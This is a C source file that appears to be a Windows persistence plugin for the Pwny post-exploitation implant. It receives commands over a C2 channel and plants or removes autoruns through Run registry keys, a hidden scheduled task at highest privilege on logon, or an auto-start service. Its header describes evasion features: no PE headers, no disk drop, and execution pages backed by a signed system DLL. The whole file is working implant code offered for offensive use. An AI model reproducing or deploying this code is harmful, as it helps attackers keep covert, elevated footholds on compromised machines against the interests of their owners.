/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Persist COT plugin — persistence mechanisms.
 *
 * Built as a COT (Code-Only Tab) blob: no PE headers in memory,
 * no disk drop, all executable pages backed by a signed system DLL.
 * All Pwny API calls go through the vtable; all Win32 APIs are
 * resolved at runtime via cot_resolve().
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <windows.h>

/* tab_cot.h MUST come after the real Pwny headers */
#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* ------------------------------------------------------------------ */
/* Win32 / CRT function pointer types — resolved at init               */
/* ------------------------------------------------------------------ */

typedef LONG      (WINAPI *fn_RegOpenKeyExA)(HKEY, LPCSTR, DWORD,
                                             REGSAM, PHKEY);
typedef LONG      (WINAPI *fn_RegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD,
                                              const BYTE *, DWORD);
typedef LONG      (WINAPI *fn_RegCloseKey)(HKEY);
typedef LONG      (WINAPI *fn_RegDeleteValueA)(HKEY, LPCSTR);
typedef LONG      (WINAPI *fn_RegEnumValueA)(HKEY, DWORD, LPSTR, LPDWORD,
                                             LPDWORD, LPDWORD, LPBYTE,
                                             LPDWORD);
typedef BOOL      (WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR,
                                              LPSECURITY_ATTRIBUTES,
                                              LPSECURITY_ATTRIBUTES,
                                              BOOL, DWORD, LPVOID, LPCSTR,
                                              LPSTARTUPINFOA,
                                              LPPROCESS_INFORMATION);
typedef DWORD     (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
typedef BOOL      (WINAPI *fn_CloseHandle)(HANDLE);
typedef DWORD     (WINAPI *fn_GetLastError)(void);
typedef SC_HANDLE (WINAPI *fn_OpenSCManagerA)(LPCSTR, LPCSTR, DWORD);
typedef SC_HANDLE (WINAPI *fn_CreateServiceA)(SC_HANDLE, LPCSTR, LPCSTR,
                                              DWORD, DWORD, DWORD, DWORD,
                                              LPCSTR, LPCSTR, LPDWORD,
                                              LPCSTR, LPCSTR, LPCSTR);
typedef SC_HANDLE (WINAPI *fn_OpenServiceA)(SC_HANDLE, LPCSTR, DWORD);
typedef BOOL      (WINAPI *fn_DeleteService)(SC_HANDLE);
typedef BOOL      (WINAPI *fn_CloseServiceHandle)(SC_HANDLE);
typedef int       (*fn__snprintf)(char *, size_t, const char *, ...);

static struct
{
    fn_RegOpenKeyExA       pRegOpenKeyExA;
    fn_RegSetValueExA      pRegSetValueExA;
    fn_RegCloseKey         pRegCloseKey;
    fn_RegDeleteValueA     pRegDeleteValueA;
    fn_RegEnumValueA       pRegEnumValueA;
    fn_CreateProcessA      pCreateProcessA;
    fn_WaitForSingleObject pWaitForSingleObject;
    fn_CloseHandle         pCloseHandle;
    fn_GetLastError        pGetLastError;
    fn_OpenSCManagerA      pOpenSCManagerA;
    fn_CreateServiceA      pCreateServiceA;
    fn_OpenServiceA        pOpenServiceA;
    fn_DeleteService       pDeleteService;
    fn_CloseServiceHandle  pCloseServiceHandle;
    fn__snprintf           p_snprintf;
} w;


#define PERSIST_INSTALL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL)

#define PERSIST_REMOVE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 1)

#define PERSIST_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 2)

#define TLV_TYPE_PERSIST_TYPE  TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE)
#define TLV_TYPE_PERSIST_NAME  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define TLV_TYPE_PERSIST_CMD   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
#define TLV_TYPE_PERSIST_GROUP TLV_TYPE_CUSTOM(TLV_TYPE_GROUP, TAB_BASE, API_TYPE)

#define PERSIST_REGISTRY_HKCU  1
#define PERSIST_REGISTRY_HKLM  2
#define PERSIST_SCHTASK        3
#define PERSIST_SERVICE        4

static const char *persist_run_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

static tlv_pkt_t *persist_install(c2_t *c2)
{
    int technique;
    char name[256];
    char cmd[1024];
    HKEY hKey;
    LONG lResult;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_PERSIST_TYPE, &technique) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_PERSIST_NAME, name) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_PERSIST_CMD, cmd) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    switch (technique)
    {
        case PERSIST_REGISTRY_HKCU:
        {
            lResult = w.pRegOpenKeyExA(HKEY_CURRENT_USER, persist_run_key,
                                       0, KEY_SET_VALUE, &hKey);
            if (lResult != ERROR_SUCCESS)
            {
                log_debug("* persist: RegOpenKeyEx HKCU failed (%ld)\n", lResult);
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            lResult = w.pRegSetValueExA(hKey, name, 0, REG_SZ,
                                        (BYTE *)cmd, (DWORD)(strlen(cmd) + 1));
            w.pRegCloseKey(hKey);

            if (lResult != ERROR_SUCCESS)
            {
                log_debug("* persist: RegSetValueEx failed (%ld)\n", lResult);
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            break;
        }

        case PERSIST_REGISTRY_HKLM:
        {
            lResult = w.pRegOpenKeyExA(HKEY_LOCAL_MACHINE, persist_run_key,
                                       0, KEY_SET_VALUE, &hKey);
            if (lResult != ERROR_SUCCESS)
            {
                log_debug("* persist: RegOpenKeyEx HKLM failed (%ld)\n", lResult);
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            lResult = w.pRegSetValueExA(hKey, name, 0, REG_SZ,
                                        (BYTE *)cmd, (DWORD)(strlen(cmd) + 1));
            w.pRegCloseKey(hKey);

            if (lResult != ERROR_SUCCESS)
            {
                log_debug("* persist: RegSetValueEx failed (%ld)\n", lResult);
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            break;
        }

        case PERSIST_SCHTASK:
        {
            char schtask_cmd[2048];
            STARTUPINFOA si;
            PROCESS_INFORMATION pi;

            w.p_snprintf(schtask_cmd, sizeof(schtask_cmd),
                         "schtasks /Create /TN \"%s\" /TR \"%s\" "
                         "/SC ONLOGON /RL HIGHEST /F",
                         name, cmd);
            schtask_cmd[sizeof(schtask_cmd) - 1] = '\0';

            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            memset(&pi, 0, sizeof(pi));

            if (!w.pCreateProcessA(NULL, schtask_cmd, NULL, NULL, FALSE,
                                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
            {
                log_debug("* persist: schtasks CreateProcess failed (%lu)\n",
                          w.pGetLastError());
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            w.pWaitForSingleObject(pi.hProcess, 10000);
            w.pCloseHandle(pi.hThread);
            w.pCloseHandle(pi.hProcess);
            break;
        }

        case PERSIST_SERVICE:
        {
            SC_HANDLE scm;
            SC_HANDLE svc;

            scm = w.pOpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
            if (scm == NULL)
            {
                log_debug("* persist: OpenSCManager failed (%lu)\n", w.pGetLastError());
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            svc = w.pCreateServiceA(scm, name, name,
                                    SERVICE_ALL_ACCESS,
                                    SERVICE_WIN32_OWN_PROCESS,
                                    SERVICE_AUTO_START,
                                    SERVICE_ERROR_IGNORE,
                                    cmd, NULL, NULL, NULL, NULL, NULL);

            if (svc == NULL)
            {
                log_debug("* persist: CreateService failed (%lu)\n", w.pGetLastError());
                w.pCloseServiceHandle(scm);
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            w.pCloseServiceHandle(svc);
            w.pCloseServiceHandle(scm);
            break;
        }

        default:
            return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *persist_remove(c2_t *c2)
{
    int technique;
    char name[256];
    HKEY hKey;
    LONG lResult;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_PERSIST_TYPE, &technique) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_PERSIST_NAME, name) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    switch (technique)
    {
        case PERSIST_REGISTRY_HKCU:
        {
            lResult = w.pRegOpenKeyExA(HKEY_CURRENT_USER, persist_run_key,
                                       0, KEY_SET_VALUE, &hKey);
            if (lResult != ERROR_SUCCESS)
            {
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            lResult = w.pRegDeleteValueA(hKey, name);
            w.pRegCloseKey(hKey);

            if (lResult != ERROR_SUCCESS)
            {
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }
            break;
        }

        case PERSIST_REGISTRY_HKLM:
        {
            lResult = w.pRegOpenKeyExA(HKEY_LOCAL_MACHINE, persist_run_key,
                                       0, KEY_SET_VALUE, &hKey);
            if (lResult != ERROR_SUCCESS)
            {
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            lResult = w.pRegDeleteValueA(hKey, name);
            w.pRegCloseKey(hKey);

            if (lResult != ERROR_SUCCESS)
            {
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }
            break;
        }

        case PERSIST_SCHTASK:
        {
            char schtask_cmd[512];
            STARTUPINFOA si;
            PROCESS_INFORMATION pi;

            w.p_snprintf(schtask_cmd, sizeof(schtask_cmd),
                         "schtasks /Delete /TN \"%s\" /F", name);
            schtask_cmd[sizeof(schtask_cmd) - 1] = '\0';

            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            memset(&pi, 0, sizeof(pi));

            if (!w.pCreateProcessA(NULL, schtask_cmd, NULL, NULL, FALSE,
                                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
            {
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            w.pWaitForSingleObject(pi.hProcess, 10000);
            w.pCloseHandle(pi.hThread);
            w.pCloseHandle(pi.hProcess);
            break;
        }

        case PERSIST_SERVICE:
        {
            SC_HANDLE scm;
            SC_HANDLE svc;

            scm = w.pOpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
            if (scm == NULL)
            {
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            svc = w.pOpenServiceA(scm, name, DELETE);
            if (svc == NULL)
            {
                w.pCloseServiceHandle(scm);
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            if (!w.pDeleteService(svc))
            {
                w.pCloseServiceHandle(svc);
                w.pCloseServiceHandle(scm);
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            w.pCloseServiceHandle(svc);
            w.pCloseServiceHandle(scm);
            break;
        }

        default:
            return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *persist_list(c2_t *c2)
{
    HKEY hKey;
    LONG lResult;
    DWORD index;
    char valueName[256];
    DWORD nameLen;
    BYTE valueData[1024];
    DWORD dataLen;
    DWORD valueType;
    tlv_pkt_t *result;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    lResult = w.pRegOpenKeyExA(HKEY_CURRENT_USER, persist_run_key,
                               0, KEY_READ, &hKey);
    if (lResult == ERROR_SUCCESS)
    {
        for (index = 0; ; index++)
        {
            nameLen = sizeof(valueName);
            dataLen = sizeof(valueData);

            lResult = w.pRegEnumValueA(hKey, index, valueName, &nameLen,
                                       NULL, &valueType, valueData, &dataLen);
            if (lResult != ERROR_SUCCESS)
            {
                break;
            }

            if (valueType == REG_SZ || valueType == REG_EXPAND_SZ)
            {
                tlv_pkt_t *entry = tlv_pkt_create();
                tlv_pkt_add_u32(entry, TLV_TYPE_PERSIST_TYPE, PERSIST_REGISTRY_HKCU);
                tlv_pkt_add_string(entry, TLV_TYPE_PERSIST_NAME, valueName);
                tlv_pkt_add_string(entry, TLV_TYPE_PERSIST_CMD, (char *)valueData);
                tlv_pkt_add_tlv(result, TLV_TYPE_PERSIST_GROUP, entry);
                tlv_pkt_destroy(entry);
            }
        }

        w.pRegCloseKey(hKey);
    }

    lResult = w.pRegOpenKeyExA(HKEY_LOCAL_MACHINE, persist_run_key,
                               0, KEY_READ, &hKey);
    if (lResult == ERROR_SUCCESS)
    {
        for (index = 0; ; index++)
        {
            nameLen = sizeof(valueName);
            dataLen = sizeof(valueData);

            lResult = w.pRegEnumValueA(hKey, index, valueName, &nameLen,
                                       NULL, &valueType, valueData, &dataLen);
            if (lResult != ERROR_SUCCESS)
            {
                break;
            }

            if (valueType == REG_SZ || valueType == REG_EXPAND_SZ)
            {
                tlv_pkt_t *entry = tlv_pkt_create();
                tlv_pkt_add_u32(entry, TLV_TYPE_PERSIST_TYPE, PERSIST_REGISTRY_HKLM);
                tlv_pkt_add_string(entry, TLV_TYPE_PERSIST_NAME, valueName);
                tlv_pkt_add_string(entry, TLV_TYPE_PERSIST_CMD, (char *)valueData);
                tlv_pkt_add_tlv(result, TLV_TYPE_PERSIST_GROUP, entry);
                tlv_pkt_destroy(entry);
            }
        }

        w.pRegCloseKey(hKey);
    }

    return result;
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    /* Resolve advapi32.dll functions */
    w.pRegOpenKeyExA      = (fn_RegOpenKeyExA)cot_resolve("advapi32.dll",
                                                          "RegOpenKeyExA");
    w.pRegSetValueExA     = (fn_RegSetValueExA)cot_resolve("advapi32.dll",
                                                           "RegSetValueExA");
    w.pRegCloseKey        = (fn_RegCloseKey)cot_resolve("advapi32.dll",
                                                        "RegCloseKey");
    w.pRegDeleteValueA    = (fn_RegDeleteValueA)cot_resolve("advapi32.dll",
                                                            "RegDeleteValueA");
    w.pRegEnumValueA      = (fn_RegEnumValueA)cot_resolve("advapi32.dll",
                                                           "RegEnumValueA");
    w.pOpenSCManagerA     = (fn_OpenSCManagerA)cot_resolve("advapi32.dll",
                                                           "OpenSCManagerA");
    w.pCreateServiceA     = (fn_CreateServiceA)cot_resolve("advapi32.dll",
                                                           "CreateServiceA");
    w.pOpenServiceA       = (fn_OpenServiceA)cot_resolve("advapi32.dll",
                                                         "OpenServiceA");
    w.pDeleteService      = (fn_DeleteService)cot_resolve("advapi32.dll",
                                                          "DeleteService");
    w.pCloseServiceHandle = (fn_CloseServiceHandle)cot_resolve("advapi32.dll",
                                                               "CloseServiceHandle");

    /* Resolve kernel32.dll functions */
    w.pCreateProcessA      = (fn_CreateProcessA)cot_resolve("kernel32.dll",
                                                            "CreateProcessA");
    w.pWaitForSingleObject = (fn_WaitForSingleObject)cot_resolve("kernel32.dll",
                                                                  "WaitForSingleObject");
    w.pCloseHandle         = (fn_CloseHandle)cot_resolve("kernel32.dll",
                                                         "CloseHandle");
    w.pGetLastError        = (fn_GetLastError)cot_resolve("kernel32.dll",
                                                          "GetLastError");

    /* Resolve msvcrt.dll functions */
    w.p_snprintf = (fn__snprintf)cot_resolve("msvcrt.dll", "_snprintf");

    api_call_register(api_calls, PERSIST_INSTALL, (api_t)persist_install);
    api_call_register(api_calls, PERSIST_REMOVE, (api_t)persist_remove);
    api_call_register(api_calls, PERSIST_LIST, (api_t)persist_list);
}

#endif
